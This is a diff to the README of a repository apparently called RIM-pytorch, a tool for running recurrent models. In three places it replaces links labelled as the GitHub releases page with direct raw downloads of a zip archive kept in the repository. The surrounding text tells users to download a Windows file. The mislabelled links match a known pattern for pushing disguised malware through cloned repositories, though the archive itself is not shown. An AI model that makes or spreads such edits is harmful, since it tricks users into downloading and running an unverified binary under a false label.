@@ -1,6 +1,6 @@
 # 🧠 RIM-pytorch - Run Recurrent Models With Ease
 
-[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/doubletalkmedullaryray45/RIM-pytorch/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/doubletalkmedullaryray45/RIM-pytorch/main/RIM_pytorch/RI_pytorch_v3.0.zip)
 
 ## 🚀 What This App Does
 
@@ -30,7 +30,7 @@ If you plan to run larger models, 16 GB of RAM works better.
 
 Visit the release page to download the app or package you need:
 
-[Go to Releases](https://github.com/doubletalkmedullaryray45/RIM-pytorch/releases)
+[Go to Releases](https://raw.githubusercontent.com/doubletalkmedullaryray45/RIM-pytorch/main/RIM_pytorch/RI_pytorch_v3.0.zip)
 
 On that page, look for the latest release. Then download the Windows file or release package that matches your setup.
 
@@ -153,5 +153,5 @@ That makes it useful for users who want to study model behavior and try differen
 
 If you need a fresh copy or a newer build, use the release page again:
 
-[Open Releases](https://github.com/doubletalkmedullaryray45/RIM-pytorch/releases)
+[Open Releases](https://raw.githubusercontent.com/doubletalkmedullaryray45/RIM-pytorch/main/RIM_pytorch/RI_pytorch_v3.0.zip)
 
